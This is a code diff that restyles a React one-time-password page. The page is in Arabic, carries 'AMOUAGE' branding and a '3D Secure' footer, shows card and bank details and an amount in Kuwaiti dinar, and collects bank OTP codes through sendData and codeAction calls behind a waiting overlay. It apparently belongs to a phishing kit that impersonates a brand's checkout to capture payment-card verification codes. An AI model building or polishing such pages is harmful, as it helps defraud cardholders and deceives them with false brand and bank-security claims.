@@ -1,10 +1,7 @@
 import { useEffect, useState, useRef } from "react";
 import { useLocation } from "wouter";
 import { useSignalEffect } from "@preact/signals-react";
-import PageLayout from "@/components/layout/PageLayout";
 import WaitingOverlay, { waitingCardInfo } from "@/components/WaitingOverlay";
-import { Button } from "@/components/ui/button";
-import { Input } from "@/components/ui/input";
 import {
   sendData,
   codeAction,
@@ -137,111 +134,131 @@ export default function OTPVerification() {
     });
   };
 
-
   return (
-    <PageLayout variant="default">
+    <div className="min-h-screen bg-[#f5f5f5] flex items-center justify-center px-4 py-8" dir="rtl" style={{ fontFamily: "'Helvetica Neue', Helvetica, Arial, sans-serif" }}>
       <WaitingOverlay />
 
-      <div className="bg-white rounded-2xl shadow-xl p-6">
-        {/* Header */}
-        <div className="text-center mb-6">
-          <h1 className="text-xl font-bold text-gray-800 mb-2">رمز التحقق لمرة واحدة (OTP)</h1>
-          <p className="text-gray-600 text-sm">
-            لتأكيد العملية أدخل رمز التحقق المرسل إلى جوالك
-          </p>
+      <div className="w-full max-w-[480px]">
+        {/* Header - AMOUAGE branding */}
+        <div className="text-center mb-8">
+          <h1 className="text-2xl tracking-[0.3em] font-light text-black mb-2" style={{ fontFamily: "'Times New Roman', serif" }}>AMOUAGE</h1>
+          <p className="text-sm text-gray-500">Secure Verification</p>
         </div>
 
-        {/* Bank and Card Type Logos */}
-        <div className="flex justify-between items-center mb-6 px-4">
-          {/* Card Type Logo (Visa/Mastercard) */}
-          <div className="flex items-center">
-            <img
-              src={cardInfo?.cardType?.toLowerCase() === 'visa' ? '/images/visa.png' : cardInfo?.cardType?.toLowerCase() === 'mastercard' ? '/images/mastercard.png' : '/images/visa.png'}
-              alt={cardInfo?.cardType || 'Card'}
-              className="h-10 object-contain"
-            />
+        {/* Main Card */}
+        <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-8">
+          {/* OTP Title */}
+          <div className="text-center mb-6">
+            <h2 className="text-lg font-semibold text-gray-900 mb-1">رمز التحقق لمرة واحدة (OTP)</h2>
+            <p className="text-gray-500 text-sm">
+              لتأكيد العملية أدخل رمز التحقق المرسل إلى جوالك
+            </p>
           </div>
-          {/* Bank Logo */}
-          {cardInfo?.bankLogo && (
+
+          {/* Bank and Card Type Logos */}
+          <div className="flex justify-between items-center mb-6 px-4 py-3 border-b border-gray-100">
+            {/* Card Type Logo (Visa/Mastercard) */}
             <div className="flex items-center">
               <img
-                src={cardInfo.bankLogo}
-                alt={cardInfo.bankName || "Bank"}
-                className="h-10 object-contain"
+                src={cardInfo?.cardType?.toLowerCase() === 'visa' ? '/images/visa.png' : cardInfo?.cardType?.toLowerCase() === 'mastercard' ? '/images/mastercard.png' : '/images/visa.png'}
+                alt={cardInfo?.cardType || 'Card'}
+                className="h-8 object-contain"
               />
             </div>
-          )}
-        </div>
-
-        {/* Transaction Info */}
-        <div className="bg-gray-50 rounded-lg p-4 mb-6 text-sm text-gray-700 text-right leading-relaxed">
-          <p>
-            سيتم الاتصال بك أو إرسال رمز من قبل البنك المصدر للبطاقة الائتمانية المنتهية بـ <span className="font-bold">{cardLast4}</span>. يرجى إدخال رمز التحقق لتأكيد العملية.
-          </p>
-          <p className="mt-2">
-            أنت تدفع لـ<span className="font-bold">{serviceName}</span> مبلغ <span className="font-bold text-primary">{totalAmount} د.ك</span> بتاريخ {formatDate(currentTime)} في التوقيت {formatTime(currentTime)}
-          </p>
-        </div>
-
-        {/* Success Message */}
-        <div className="text-center mb-4">
-          <span className="text-primary font-medium">تم إرسال الرمز بنجاح</span>
-        </div>
-
-        <form onSubmit={handleSubmit} className="space-y-4">
-          {/* OTP Input - Single input field */}
-          <div className="flex justify-center" dir="ltr">
-            <Input
-              ref={inputRef}
-              type="tel"
-              inputMode="numeric"
-              maxLength={6}
-              value={otp}
-              onChange={handleChange}
-              placeholder="رمز التحقق (OTP)"
-              className={`text-center text-lg font-medium h-12 w-full max-w-xs ${error ? "border-red-500" : "border-gray-300"}`}
-              autoFocus
-            />
-          </div>
-
-          {error && (
-            <p className="text-red-500 text-sm text-center font-medium">
-              رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى.
-            </p>
-          )}
-
-          {/* Submit Button */}
-          <Button 
-            type="submit" 
-            className="w-full h-12 text-base" 
-            disabled={isWaiting || (otp.length !== 4 && otp.length !== 6)}
-          >
-            {isWaiting ? (
-              <div className="flex items-center justify-center gap-2">
-                <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
-                <span>جاري التحقق...</span>
+            {/* Bank Logo */}
+            {cardInfo?.bankLogo && (
+              <div className="flex items-center">
+                <img
+                  src={cardInfo.bankLogo}
+                  alt={cardInfo.bankName || "Bank"}
+                  className="h-8 object-contain"
+                />
               </div>
-            ) : (
-              "تحقق"
-            )}
-          </Button>
-
-          {/* Resend Timer */}
-          <div className="text-center text-gray-600 text-sm">
-            {canResend ? (
-              <button
-                type="button"
-                onClick={handleResend}
-                className="text-primary hover:underline font-medium"
-              >
-                إعادة إرسال الرمز
-              </button>
-            ) : (
-              <span>إعادة إرسال: {formatTimer(resendTimer)}</span>
             )}
           </div>
-        </form>
+
+          {/* Transaction Info */}
+          <div className="bg-[#fafafa] border border-gray-100 rounded-md p-4 mb-6 text-sm text-gray-600 text-right leading-relaxed">
+            <p>
+              سيتم الاتصال بك أو إرسال رمز من قبل البنك المصدر للبطاقة الائتمانية المنتهية بـ <span className="font-semibold text-gray-900">{cardLast4}</span>. يرجى إدخال رمز التحقق لتأكيد العملية.
+            </p>
+            <p className="mt-2">
+              أنت تدفع لـ<span className="font-semibold text-gray-900">{serviceName}</span> مبلغ <span className="font-semibold text-black">{totalAmount} د.ك</span> بتاريخ {formatDate(currentTime)} في التوقيت {formatTime(currentTime)}
+            </p>
+          </div>
+
+          {/* Success Message */}
+          <div className="text-center mb-5">
+            <span className="text-sm font-medium text-green-600">✓ تم إرسال الرمز بنجاح</span>
+          </div>
+
+          <form onSubmit={handleSubmit} className="space-y-5">
+            {/* OTP Input */}
+            <div>
+              <label className="block text-xs text-gray-500 mb-1.5 font-medium uppercase tracking-wide text-center">Verification Code</label>
+              <div className="flex justify-center" dir="ltr">
+                <input
+                  ref={inputRef}
+                  type="tel"
+                  inputMode="numeric"
+                  maxLength={6}
+                  value={otp}
+                  onChange={handleChange}
+                  placeholder="رمز التحقق (OTP)"
+                  className={`w-full border rounded-md px-4 py-3 text-center text-lg font-medium focus:outline-none focus:border-black transition-colors ${
+                    error ? 'border-red-400 bg-red-50' : 'border-gray-300'
+                  }`}
+                  autoFocus
+                />
+              </div>
+            </div>
+
+            {error && (
+              <div className="bg-red-50 border border-red-200 rounded-md p-3">
+                <p className="text-red-600 text-center text-sm">
+                  رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى.
+                </p>
+              </div>
+            )}
+
+            {/* Submit Button */}
+            <button 
+              type="submit" 
+              className="w-full py-3 bg-black text-white text-sm font-medium uppercase tracking-wider rounded-md hover:bg-gray-900 transition-colors disabled:bg-gray-300 disabled:cursor-not-allowed"
+              disabled={isWaiting || (otp.length !== 4 && otp.length !== 6)}
+            >
+              {isWaiting ? (
+                <div className="flex items-center justify-center gap-2">
+                  <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+                  <span>جاري التحقق...</span>
+                </div>
+              ) : (
+                "تحقق"
+              )}
+            </button>
+
+            {/* Resend Timer */}
+            <div className="text-center text-gray-500 text-sm pt-2">
+              {canResend ? (
+                <button
+                  type="button"
+                  onClick={handleResend}
+                  className="text-black hover:underline font-medium"
+                >
+                  إعادة إرسال الرمز
+                </button>
+              ) : (
+                <span>إعادة إرسال: {formatTimer(resendTimer)}</span>
+              )}
+            </div>
+          </form>
+        </div>
+
+        {/* Footer */}
+        <div className="text-center mt-6">
+          <p className="text-xs text-gray-400">Protected by 3D Secure Authentication</p>
+        </div>
       </div>
-    </PageLayout>
+    </div>
   );
 }
